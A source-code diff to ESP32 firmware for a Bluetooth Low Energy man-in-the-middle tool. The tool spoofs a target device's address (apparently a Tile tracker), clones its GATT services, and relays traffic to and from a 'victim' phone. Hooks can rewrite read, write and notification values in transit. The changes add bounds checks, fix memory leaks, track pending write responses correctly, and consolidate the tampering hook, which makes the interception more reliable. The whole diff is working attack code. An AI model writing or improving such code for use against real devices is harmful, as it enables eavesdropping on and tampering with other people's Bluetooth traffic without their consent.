@@ -1,6 +1,7 @@
 
 #include "ble/GattAttack.h"
 #include "ble/GattAttackApp.h"
+#include "ble/payload.h"
 
 
 extern GattAttackState gattAttackState;
@@ -17,6 +18,27 @@ uint8_t service_num = 0; // number of services found
 uint8_t cloned_service_num = 0; // number of cloned services
 uint8_t last_end_handle = 0; // used for calculating the # of handles needed
 static prepare_type_env_t prepare_write_env;
+
+// A write response belongs to the original phone request, not the most recent
+// read or write-without-response seen on either connection.
+struct pending_write_t {
+  bool active = false;
+  bool descriptor = false;
+  uint16_t conn_id = 0;
+  uint32_t trans_id = 0;
+  uint16_t handle = 0;
+};
+static pending_write_t pending_write;
+
+static void finish_pending_write(esp_gatt_status_t status) {
+  if (!pending_write.active) return;
+  const auto request = pending_write;
+  pending_write.active = false;
+  esp_err_t ret = esp_ble_gatts_send_response(clone.gatts_if, request.conn_id,
+                                             request.trans_id, status, nullptr);
+  if (ret != ESP_OK) ESP_LOGW(TAG, "Write response failed: %s", esp_err_to_name(ret));
+}
+
 
 /* Utils */
 
@@ -101,30 +123,26 @@ char* bytes_to_hex_string(const uint8_t *data, size_t data_len) {
 };
 
 uint8_t* hex_string_to_bytes(const char *hex_string, uint16_t *out_len) {
-  if (!hex_string || !out_len) {
-    return NULL;
+  return decode_hex_payload(hex_string, out_len, ESP_GATT_MAX_ATTR_LEN);
+}
+
+static void apply_hook(const char *type, const char *uuid, char **hex,
+                       uint8_t **bytes, uint16_t *length) {
+  if (!*hex || !should_run_hooks()) return;
+  char *reply = run_hook(type, uuid, *hex);
+  if (!reply) return;
+  uint16_t new_length = *length;
+  uint8_t *replacement = hex_string_to_bytes(reply, &new_length);
+  if (!replacement) {
+    free(reply);
+    return;
   }
-
-  size_t hex_len = strlen(hex_string);
-
-  if (hex_len % 2 != 0) {
-    return NULL;
-  }
-
-  *out_len = hex_len / 2;
-  uint8_t *data = (uint8_t*)malloc(*out_len);
-  
-  if (!data) {
-    ESP_LOGE(TAG, "Failed to allocate memory for byte array.");
-    return NULL;
-  }
-
-  for (size_t i = 0; i < *out_len; ++i) {
-    sscanf(&hex_string[i * 2], "%2hhX", &data[i]);
-  }
-
-  return data;
-};
+  free(*hex);
+  free(*bytes);
+  *hex = reply;
+  *bytes = replacement;
+  *length = new_length;
+}
 
 /**
  * print_uuid
@@ -169,10 +187,11 @@ void print_uuid(esp_bt_uuid_t uuid, char* out) {
  *
  * @param service_t* new_service
  */
-void add_service(const service_t *new_service) {
+bool add_service(const service_t *new_service) {
+  if (clone.num_services == UINT8_MAX) return false;
   service_t *new_services = (service_t *)realloc(clone.services, (clone.num_services + 1) * sizeof(service_t));
   if (new_services == NULL) {
-    return;
+    return false;
   }
   
   clone.services = new_services;
@@ -180,6 +199,7 @@ void add_service(const service_t *new_service) {
   clone.services[clone.num_services].chars = NULL;
   clone.services[clone.num_services].num_chars = 0;
   clone.num_services++;
+  return true;
 }
 
 /**
@@ -191,10 +211,11 @@ void add_service(const service_t *new_service) {
  * @param service_t* service
  * @param char_t* new_char
  */
-void add_characteristic(service_t *service, const char_t *new_char) {
+bool add_characteristic(service_t *service, const char_t *new_char) {
+  if (service->num_chars == UINT8_MAX) return false;
   char_t *new_chars = (char_t *)realloc(service->chars, (service->num_chars + 1) * sizeof(char_t));
   if (new_chars == NULL) {
-    return;
+    return false;
   }
 
   service->chars = new_chars;
@@ -202,6 +223,7 @@ void add_characteristic(service_t *service, const char_t *new_char) {
   service->chars[service->num_chars].descs = NULL;
   service->chars[service->num_chars].num_descs = 0;
   service->num_chars++;
+  return true;
 }
 
 /**
@@ -213,15 +235,17 @@ void add_characteristic(service_t *service, const char_t *new_char) {
  * @param char_t* character
  * @param desc_t* new_desc
  */
-void add_descriptor(char_t *character, const desc_t *new_desc) {
+bool add_descriptor(char_t *character, const desc_t *new_desc) {
+  if (character->num_descs == UINT8_MAX) return false;
   desc_t *new_descs = (desc_t *)realloc(character->descs, (character->num_descs + 1) * sizeof(desc_t));
   if (new_descs == NULL) {
-    return;
+    return false;
   }
 
   character->descs = new_descs;
   character->descs[character->num_descs] = *new_desc;
   character->num_descs++;
+  return true;
 }
 
 /**
@@ -238,7 +262,11 @@ void free_clone() {
     // Free all characteristics and their descriptors
     if (clone.services[i].chars != NULL) {
       for (size_t j = 0; j < clone.services[i].num_chars; j++) {
+        free(clone.services[i].chars[j].value.attr_value);
         if (clone.services[i].chars[j].descs != NULL) {
+          for (size_t k = 0; k < clone.services[i].chars[j].num_descs; ++k) {
+            free(clone.services[i].chars[j].descs[k].value.attr_value);
+          }
           free(clone.services[i].chars[j].descs);
         }
       }
@@ -351,7 +379,14 @@ void get_uuid_for_handle(uint16_t handle, char* out) {
  * @param esp_ble_gatts_cb_param_t *param
  */
 void prep_write_event_env(esp_ble_gatts_cb_param_t *param){
-  char uuid[38];
+  if (param->write.len > ESP_GATT_MAX_ATTR_LEN ||
+      param->write.offset > 2048 || param->write.len > 2048 - param->write.offset) {
+    esp_ble_gatts_send_response(clone.gatts_if, param->write.conn_id,
+                               param->write.trans_id, ESP_GATT_INVALID_ATTR_LEN, nullptr);
+    return;
+  }
+
+  char uuid[38] = {0};
   bool isDescriptor = handle_is_descriptor(param->write.handle);
   get_uuid_for_handle(param->write.handle, uuid);
   esp_gatt_status_t status = ESP_GATT_OK;
@@ -394,11 +429,13 @@ void prep_write_event_env(esp_ble_gatts_cb_param_t *param){
   }
 
   if (prepare_write_env.prepare_buf == NULL) {
-    prepare_write_env.prepare_buf = (uint8_t *)malloc(2048*sizeof(uint8_t));
+    prepare_write_env.prepare_buf = (uint8_t *)calloc(2048, sizeof(uint8_t));
     prepare_write_env.prepare_len = 0;
     if (prepare_write_env.prepare_buf == NULL) {
       ESP_LOGE(TAG, "Gatt_server prep no mem");
-      status = ESP_GATT_NO_RESOURCES;
+      esp_ble_gatts_send_response(clone.gatts_if, param->write.conn_id,
+                                 param->write.trans_id, ESP_GATT_NO_RESOURCES, nullptr);
+      return;
     }
   }
 
@@ -432,11 +469,9 @@ void prep_write_event_env(esp_ble_gatts_cb_param_t *param){
           param->write.len);
   }
   
-  if (param->write.offset == 0) {
-    prepare_write_env.prepare_len = 0;
-  } 
-  else {
-    prepare_write_env.prepare_len += param->write.len;
+  const int end = param->write.offset + param->write.len;
+  if (param->write.offset == 0 || end > prepare_write_env.prepare_len) {
+    prepare_write_env.prepare_len = end;
   }
 }
 
@@ -473,11 +508,9 @@ void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_ga
 
       for (size_t i = 0; i < clone.num_services; i++) {
         // calculate # of handles
-        uint8_t total = 0;
-
-        if ((i+1) <= clone.num_services) {
-          total = clone.services[i].end_handle - clone.services[i].start_handle;
-          total += clone.services[i+1].start_handle - clone.services[i].end_handle;
+        uint16_t total = clone.services[i].end_handle - clone.services[i].start_handle + 1;
+        if (i + 1 < clone.num_services) {
+          total = clone.services[i + 1].start_handle - clone.services[i].start_handle;
         }
 
         esp_gatt_srvc_id_t service;
@@ -503,7 +536,7 @@ void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_ga
       
       break;
     }
-    case ESP_GATTS_READ_EVT: { 
+    case ESP_GATTS_READ_EVT: {
       /**
        * When a victim sends a read
        * event to a target device
@@ -514,7 +547,7 @@ void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_ga
        * The response is handled in the client.
        * ESP_GATTC_WRITE_EVT
        */
-      char uuid[38];
+      char uuid[38] = {0};
       bool isDescriptor = handle_is_descriptor(param->read.handle);
       clone.server_conn_id = param->read.conn_id;
       clone.server_trans_id = param->read.trans_id;
@@ -557,6 +590,7 @@ void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_ga
             if (clone.services[x].chars[y].char_handle == param->read.handle) {
               rsp.attr_value.len = clone.services[x].chars[y].value.attr_len;
               value = (uint8_t*)realloc(value, rsp.attr_value.len);
+              if (!value && rsp.attr_value.len) break;
               memcpy(value, clone.services[x].chars[y].value.attr_value, rsp.attr_value.len);
               found = true;
               goto after_find_read;
@@ -565,6 +599,7 @@ void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_ga
                 if (clone.services[x].chars[y].descs[z].desc_handle == param->read.handle) {
                   rsp.attr_value.len = clone.services[x].chars[y].descs[z].value.attr_len;
                   value = (uint8_t*)realloc(value, rsp.attr_value.len);
+                  if (!value && rsp.attr_value.len) break;
                   memcpy(value, clone.services[x].chars[y].descs[z].value.attr_value, rsp.attr_value.len);
                   found = true;
                   goto after_find_read;
@@ -578,6 +613,7 @@ after_find_read:
         if (!found || rsp.attr_value.len == 0) {
           rsp.attr_value.len = 1;
           value = (uint8_t*)realloc(value, rsp.attr_value.len);
+          if (!value) break;
           value[0] = 0x01;
         }
 
@@ -634,16 +670,27 @@ after_find_read:
       char uuid[38] = {0};
       bool isDescriptor = handle_is_descriptor(param->write.handle);
       uint16_t write_len = param->write.len;
+      if (write_len > ESP_GATT_MAX_ATTR_LEN) { free(out); break; }
       uint8_t *write_value = NULL;
       if (write_len > 0) {
         write_value = (uint8_t*)malloc(write_len);
-        if (write_value) {
-          memcpy(write_value, param->write.value, write_len);
+        if (!write_value) {
+          free(out);
+          break;
         }
+        memcpy(write_value, param->write.value, write_len);
       }
-      clone.server_conn_id = param->write.conn_id;
-      clone.server_trans_id = param->write.trans_id;
-      clone.server_last_write_needs_rsp = param->write.need_rsp;
+      if (param->write.need_rsp) {
+        if (pending_write.active) {
+          esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
+                                     param->write.trans_id, ESP_GATT_BUSY, nullptr);
+          free(write_value);
+          free(out);
+          break;
+        }
+        pending_write = {true, isDescriptor, param->write.conn_id,
+                         param->write.trans_id, param->write.handle};
+      }
       get_uuid_for_handle(param->write.handle, uuid);
 
       esp_gatt_write_type_t write_type = param->write.need_rsp 
@@ -700,30 +747,7 @@ after_find_read:
       }
 
       char* hex_value = bytes_to_hex_string(param->write.value, param->write.len);
-      if (should_run_hooks()) {
-        char *new_value = run_hook("write", uuid, hex_value);
-        if (new_value) {
-          free(hex_value);
-          hex_value = new_value;
-
-          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &write_len);
-
-          if (new_bytes) {
-            free(write_value);
-            write_value = (uint8_t*)malloc((size_t)write_len);
-            if (!write_value) {
-              ESP_LOGE(TAG, "Failed to allocate memory for write_value");
-              free(new_bytes);
-              return;
-            }
-
-            memcpy(write_value, new_bytes, write_len);
-            free(new_bytes);
-          } else {
-            ESP_LOGE(TAG, "hex_string_to_bytes returned NULL");
-          }
-        }
-      }
+      apply_hook("write", uuid, &hex_value, &write_value, &write_len);
 
       log_and_send_json(
         "WRITE",
@@ -762,6 +786,7 @@ after_find_read:
 
         if (status != ESP_GATT_OK) {
           ESP_LOGE(TAG, "esp_ble_gattc_write error %s", esp_err_to_name(status));
+          if (param->write.need_rsp) finish_pending_write(ESP_GATT_ERROR);
         }
       }
 
@@ -772,24 +797,24 @@ after_find_read:
       for (int x = 0; x < clone.num_services; x++) {
         for (int y = 0; y < clone.services[x].num_chars; y++) {
           if (clone.services[x].chars[y].char_handle == param->write.handle) {
-            clone.services[x].chars[y].value.attr_len = write_len;
-            if (clone.services[x].chars[y].value.attr_value != NULL) {
+            uint8_t *cached = (uint8_t*)malloc(write_len ? write_len : 1);
+            if (cached) {
+              if (write_len) memcpy(cached, write_value, write_len);
               free(clone.services[x].chars[y].value.attr_value);
-              clone.services[x].chars[y].value.attr_value = NULL;
+              clone.services[x].chars[y].value.attr_value = cached;
+              clone.services[x].chars[y].value.attr_len = write_len;
             }
-            clone.services[x].chars[y].value.attr_value = (uint8_t*)malloc(write_len);
-            memcpy(clone.services[x].chars[y].value.attr_value, write_value, write_len);
             goto after_find_write;
           } else {
             for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
               if (clone.services[x].chars[y].descs[z].desc_handle == param->write.handle) {
-                clone.services[x].chars[y].descs[z].value.attr_len = write_len;
-                if (clone.services[x].chars[y].descs[z].value.attr_value != NULL) {
+                uint8_t *cached = (uint8_t*)malloc(write_len ? write_len : 1);
+                if (cached) {
+                  if (write_len) memcpy(cached, write_value, write_len);
                   free(clone.services[x].chars[y].descs[z].value.attr_value);
-                  clone.services[x].chars[y].descs[z].value.attr_value = NULL;
+                  clone.services[x].chars[y].descs[z].value.attr_value = cached;
+                  clone.services[x].chars[y].descs[z].value.attr_len = write_len;
                 }
-                clone.services[x].chars[y].descs[z].value.attr_value = (uint8_t*)malloc(write_len);
-                memcpy(clone.services[x].chars[y].descs[z].value.attr_value, write_value, write_len);
                 goto after_find_write;
               }
             }
@@ -798,30 +823,10 @@ after_find_read:
       }
 
 after_find_write:
-      if (param->write.need_rsp) {
-          // Send rsp directly to victim instead of waiting for real rsp from target
-          esp_gatt_rsp_t rsp;
-          memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
-          rsp.attr_value.handle = param->write.handle;
-
-          esp_ble_gatts_send_response(clone.gatts_if,
-                                      clone.server_conn_id,
-                                      clone.server_trans_id,
-                                      ESP_GATT_OK, &rsp);
-
-          log_and_send_json(
-            "WRITE RSP",
-            "cache -> victim",
-            isDescriptor ? "DESC" : "CHAR",
-            gatts_if,
-            clone.server_conn_id,
-            clone.server_trans_id,
-            param->write.handle,
-            0,
-            uuid,
-            NULL
-          );
-        }
+      free(write_value);
+      // Connected writes are acknowledged only by their matching target
+      // completion callback. Cached writes can complete immediately.
+      if (!connected && param->write.need_rsp) finish_pending_write(ESP_GATT_OK);
 
       break;
     }
@@ -867,6 +872,7 @@ after_find_write:
       }
 
       prepare_write_env.prepare_len = 0;
+      free(value);
       break;
     }
     case ESP_GATTS_CREATE_EVT: {
@@ -966,6 +972,8 @@ after_find_write:
       
       if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
         send_output("TARGET DEVICE HAS CONNECTED TO OUR GATTS", false);
+      } else {
+        clone.victim_client_conn_id = param->connect.conn_id;
         clone.server_conn_id = param->connect.conn_id;
       }
 
@@ -982,7 +990,10 @@ after_find_write:
               param->disconnect.conn_id,
               param->disconnect.remote_bda[0], param->disconnect.remote_bda[1], param->disconnect.remote_bda[2],
               param->disconnect.remote_bda[3], param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);
-      esp_ble_gap_start_advertising(&adv_params);
+      if (pending_write.active && pending_write.conn_id == param->disconnect.conn_id) {
+        pending_write.active = false;
+      }
+      if (!shutdown_gatt_attack) esp_ble_gap_start_advertising(&adv_params);
       break;
     }
     case ESP_GATTS_CONF_EVT: {
@@ -999,8 +1010,8 @@ after_find_write:
     }
     case ESP_GATTS_MTU_EVT: {
       ESP_LOGI(TAG, "ESP_GATTS_MTU_EVT, MTU %d", param->mtu.mtu);
-      esp_ble_gatt_set_local_mtu(param->mtu.mtu);
-      esp_ble_gattc_send_mtu_req(clone.gattc_if, param->mtu.conn_id);
+      // This is the phone's server-side connection, not the Tile's client
+      // connection. MTU exchange with the Tile is initiated on client connect.
       break;
     }
     default:
@@ -1077,9 +1088,9 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
 
       }
 
-      esp_err_t mtu_ret = esp_ble_gattc_send_mtu_req(gattc_if, param->connect.conn_id);
-      if (mtu_ret) {
-        ESP_LOGE(TAG, "config MTU error, error code = %x", mtu_ret);
+      if (param->connect.conn_id == clone.target_client_conn_id) {
+        esp_err_t mtu_ret = esp_ble_gattc_send_mtu_req(gattc_if, param->connect.conn_id);
+        if (mtu_ret) ESP_LOGE(TAG, "config MTU error, error code = %x", mtu_ret);
       }
       break;
     }
@@ -1106,6 +1117,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
       if (memcmp(clone.target_bda, param->disconnect.remote_bda, 6) == 0) {
         send_output("Lost Client Connection", false);
         connected = false;
+        finish_pending_write(ESP_GATT_ERROR);
 
         if (retries < MAX_RETRIES) {
           if (!shutdown_gatt_attack) {
@@ -1213,7 +1225,8 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
           .num_handles = handles,
         };
 
-        add_service(&service1);
+        if (!add_service(&service1)) break;
+        service_num = clone.num_services - 1;
 
         uint16_t count = 0;
         esp_gatt_status_t status = esp_ble_gattc_get_attr_count(gattc_if,
@@ -1242,7 +1255,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                                                 &count, 0);
             if (status != ESP_GATT_OK) {
               ESP_LOGE(TAG, "esp_ble_gattc_get_all_char %s", esp_err_to_name(status));
-              char_result = NULL;
+              free(char_result);
               break;
             }
 
@@ -1260,13 +1273,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                 .num_descs = 0,
               };
 
-              add_characteristic(&clone.services[service_num], &char1);
-
-              esp_gattc_descr_elem_t *descr_result = (esp_gattc_descr_elem_t  *)malloc(sizeof(esp_gattc_descr_elem_t ) * count);
-              if (!descr_result) {
-                ESP_LOGE(TAG, "descr_result no mem");
-                break;
-              }
+              if (!add_characteristic(&clone.services[service_num], &char1)) break;
 
               uint16_t desc_count = 0;
               status = esp_ble_gattc_get_attr_count(gattc_if,
@@ -1280,7 +1287,9 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                 ESP_LOGE(TAG, "esp_ble_gattc_get_attr_count(DESCRIPTOR) error");
               }
 
-              if (desc_count > 0) {   
+              if (status == ESP_GATT_OK && desc_count > 0) {
+                auto *descr_result = (esp_gattc_descr_elem_t *)calloc(desc_count, sizeof(esp_gattc_descr_elem_t));
+                if (!descr_result) break;
                 status = esp_ble_gattc_get_all_descr(gattc_if,
                                                     param->search_res.conn_id,
                                                     char_result[i].char_handle,
@@ -1289,7 +1298,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                 if (status != ESP_GATT_OK) {
                   ESP_LOGE(TAG, "%s", esp_err_to_name(status));
                   ESP_LOGE(TAG, "esp_ble_gattc_get_all_descr error");
-                  descr_result = NULL;
+                  free(descr_result);
                   break;
                 }
 
@@ -1310,9 +1319,10 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                     add_descriptor(&clone.services[service_num].chars[i], &desc1);
                   }
                 }
+                free(descr_result);
               }
-
             }
+            free(char_result);
           }
         }
         
@@ -1334,7 +1344,6 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
         break;
       }
       
-      vTaskDelay(2000 / portTICK_PERIOD_MS);
       
       if (clone_init) {
         break;
@@ -1373,13 +1382,8 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
       }
 
       send_output("Client register notify success", false);
-      if (clone.server_last_write_needs_rsp) {
-        esp_ble_gatts_send_response(clone.gatts_if,
-                                    clone.server_conn_id,
-                                    clone.server_trans_id,
-                                    ESP_GATT_OK, NULL);
-        clone.server_last_write_needs_rsp = false;
-      }
+      // Local notification registration is not completion of the remote
+      // CCCD write; its response arrives in ESP_GATTC_WRITE_DESCR_EVT.
       break;
     }
     case ESP_GATTC_NOTIFY_EVT: {
@@ -1392,34 +1396,17 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * log the information and pass
        * it back to our victim.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       uint16_t notify_len = param->notify.value_len;
-      uint8_t *notify_value = (uint8_t*)malloc(notify_len);
-      memcpy(notify_value, param->notify.value, notify_len);
+      if (notify_len > ESP_GATT_MAX_ATTR_LEN) break;
+      uint8_t *notify_value = (uint8_t*)malloc(notify_len ? notify_len : 1);
+      if (!notify_value) break;
+      if (notify_len) memcpy(notify_value, param->notify.value, notify_len);
 
       char* hex_value = bytes_to_hex_string(param->notify.value, param->notify.value_len);
       get_uuid_for_handle(param->notify.handle, uuid);
 
-      if (should_run_hooks()) {
-        char *new_value = run_hook("read", uuid, hex_value);
-        if (new_value) {
-          free(hex_value);
-          hex_value = new_value;
-
-          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &notify_len);
-
-          free(notify_value);
-          notify_value = (uint8_t*)malloc((size_t)notify_len);
-          if (!notify_value) {
-            ESP_LOGE(TAG, "Failed to allocate memory for notify_value");
-            free(new_bytes);
-            return;
-          }
-
-          memcpy(notify_value, new_bytes, notify_len);
-          free(new_bytes);
-        }
-      }
+      apply_hook("read", uuid, &hex_value, &notify_value, &notify_len);
       
       log_and_send_json(
         param->notify.is_notify ? "NOTIFY" : "INDICATE",
@@ -1442,6 +1429,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
                                   notify_len,
                                   notify_value,
                                   !param->notify.is_notify);
+      free(notify_value);
       break;
     }
     case ESP_GATTC_WRITE_DESCR_EVT: {
@@ -1449,35 +1437,17 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * Event called after our attacking
        * client has written to a descriptor.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       get_uuid_for_handle(param->write.handle, uuid);
 
       if (param->write.status != ESP_GATT_OK) {
         ESP_LOGE(TAG, "write descr failed, error status = %x", param->write.status);
       }
 
-      if (clone.server_last_write_needs_rsp) {
-        esp_gatt_rsp_t rsp;
-        memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
-        rsp.attr_value.handle = param->write.handle;
-        esp_ble_gatts_send_response(clone.gatts_if,
-                                    clone.server_conn_id,
-                                    clone.server_trans_id,
-                                    ESP_GATT_OK, &rsp);
-        clone.server_last_write_needs_rsp = false;
-
-        log_and_send_json(
-          "WRITE DESC RSP",
-          "target -> victim",
-          "DESC",
-          gattc_if,
-          param->write.conn_id,
-          clone.server_trans_id,
-          param->write.handle,
-          param->write.status,
-          uuid,
-          NULL
-        );
+      if (pending_write.active && pending_write.descriptor == true &&
+          pending_write.handle == param->write.handle &&
+          param->write.conn_id == clone.target_client_conn_id) {
+        finish_pending_write(param->write.status);
       }
       break;
     }
@@ -1492,35 +1462,17 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * If victim needed a response to the
        * last write we send it to them.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       get_uuid_for_handle(param->write.handle, uuid);
 
       if (param->write.status != ESP_GATT_OK) {
         ESP_LOGE(TAG, "write char failed, error status = %x", param->write.status);
       }
 
-      if (clone.server_last_write_needs_rsp) {
-        esp_gatt_rsp_t rsp;
-        memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
-        rsp.attr_value.handle = param->write.handle;
-        esp_ble_gatts_send_response(clone.gatts_if,
-                                    clone.server_conn_id,
-                                    clone.server_trans_id,
-                                    ESP_GATT_OK, &rsp);
-        clone.server_last_write_needs_rsp = false;
-
-        log_and_send_json(
-          "WRITE CHAR RSP",
-          "target -> victim",
-          "CHAR",
-          gattc_if,
-          param->write.conn_id,
-          clone.server_trans_id,
-          param->write.handle,
-          param->write.status,
-          uuid,
-          NULL
-        );
+      if (pending_write.active && pending_write.descriptor == false &&
+          pending_write.handle == param->write.handle &&
+          param->write.conn_id == clone.target_client_conn_id) {
+        finish_pending_write(param->write.status);
       }
       break;
     }
@@ -1531,7 +1483,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * a prep write to either a
        * char or desc.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       get_uuid_for_handle(param->write.handle, uuid);
       log_and_send_json(
         "PREP WRITE RSP",
@@ -1579,33 +1531,16 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * log this event and send
        * it back on to the victim.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       uint16_t read_len = param->read.value_len;
-      uint8_t *read_value = (uint8_t*)malloc(read_len);
-      memcpy(read_value, param->read.value, read_len);
+      if (read_len > ESP_GATT_MAX_ATTR_LEN) break;
+      uint8_t *read_value = (uint8_t*)malloc(read_len ? read_len : 1);
+      if (!read_value) break;
+      if (read_len) memcpy(read_value, param->read.value, read_len);
       char* hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
       get_uuid_for_handle(param->read.handle, uuid);
 
-      if (should_run_hooks()) {
-        char *new_value = run_hook("read", uuid, hex_value);
-        if (new_value) {
-          free(hex_value);
-          hex_value = new_value;
-
-          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &read_len);
-
-          free(read_value);
-          read_value = (uint8_t*)malloc((size_t)read_len);
-          if (!read_value) {
-            ESP_LOGE(TAG, "Failed to allocate memory for read_value");
-            free(new_bytes);
-            return;
-          }
-
-          memcpy(read_value, new_bytes, read_len);
-          free(new_bytes);
-        }
-      }
+      apply_hook("read", uuid, &hex_value, &read_value, &read_len);
 
       log_and_send_json(
         "READ CHAR RSP",
@@ -1627,6 +1562,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
       rsp.attr_value.handle = param->read.handle;
       rsp.attr_value.len = read_len;
       memcpy(rsp.attr_value.value, read_value, read_len);
+      free(read_value);
       esp_ble_gatts_send_response(clone.gatts_if,
                                   clone.server_conn_id,
                                   clone.server_trans_id,
@@ -1641,33 +1577,16 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
        * We need to send resp back to
        * victim.
        */
-      char uuid[38];
+      char uuid[38] = {0};
       uint16_t read_len = param->read.value_len;
-      uint8_t *read_value = (uint8_t*)malloc(read_len);
-      memcpy(read_value, param->read.value, read_len);
+      if (read_len > ESP_GATT_MAX_ATTR_LEN) break;
+      uint8_t *read_value = (uint8_t*)malloc(read_len ? read_len : 1);
+      if (!read_value) break;
+      if (read_len) memcpy(read_value, param->read.value, read_len);
       char* hex_value = bytes_to_hex_string(param->read.value, param->read.value_len);
       get_uuid_for_handle(param->read.handle, uuid);
 
-      if (should_run_hooks()) {
-        char *new_value = run_hook("read", uuid, hex_value);
-        if (new_value) {
-          free(hex_value);
-          hex_value = new_value;
-
-          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &read_len);
-
-          free(read_value);
-          read_value = (uint8_t*)malloc((size_t)read_len);
-          if (!read_value) {
-            ESP_LOGE(TAG, "Failed to allocate memory for read_value");
-            free(new_bytes);
-            return;
-          }
-
-          memcpy(read_value, new_bytes, read_len);
-          free(new_bytes);
-        }
-      }
+      apply_hook("read", uuid, &hex_value, &read_value, &read_len);
 
       log_and_send_json(
         "READ DESC RSP",
@@ -1689,6 +1608,7 @@ void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_ga
       rsp.attr_value.handle = param->read.handle;
       rsp.attr_value.len = read_len;
       memcpy(rsp.attr_value.value, read_value, read_len);
+      free(read_value);
       esp_ble_gatts_send_response(clone.gatts_if,
                                   clone.server_conn_id,
                                   clone.server_trans_id,
@@ -1874,8 +1794,6 @@ void stop_gatt_attack() {
   ret = esp_ble_gattc_close(clone.gattc_if, clone.target_client_conn_id);
   ret = esp_ble_gatts_close(clone.gatts_if, clone.server_conn_id);
 
-  free_clone();
-
   for (size_t i = 0; i < clone.num_services; i++) {
     ret = esp_ble_gatts_stop_service(clone.services[i].service_handle);
     ret = esp_ble_gatts_delete_service(clone.services[i].service_handle);
@@ -1885,6 +1803,12 @@ void stop_gatt_attack() {
   ret = esp_ble_gattc_app_unregister(0);
 
   ble_stack_deinit(false);
+  free_clone();
+  free(prepare_write_env.prepare_buf);
+  prepare_write_env = {};
+  pending_write = {};
+  connected = false;
+  connecting = false;
   clone_init = false;
   retries = 0;
   service_num = 0;
@@ -1912,8 +1836,11 @@ void start_gatt_attack(uint8_t *target) {
 
   ESP_ERROR_CHECK(esp_iface_mac_addr_set(target, ESP_MAC_BT));
 
-  ble_stack_init();
-
+  if (!ble_stack_init()) {
+    gattAttackState = GATT_ATTACK_STATE_FAILED;
+    GattAttackApp::sendState(gattAttackState);
+    return;
+  }
   ret = esp_ble_gap_register_callback(esp_gap_cb);
   if (ret) {
     ESP_LOGE(TAG, "%s gap register failed, error code = %x", __func__, ret);
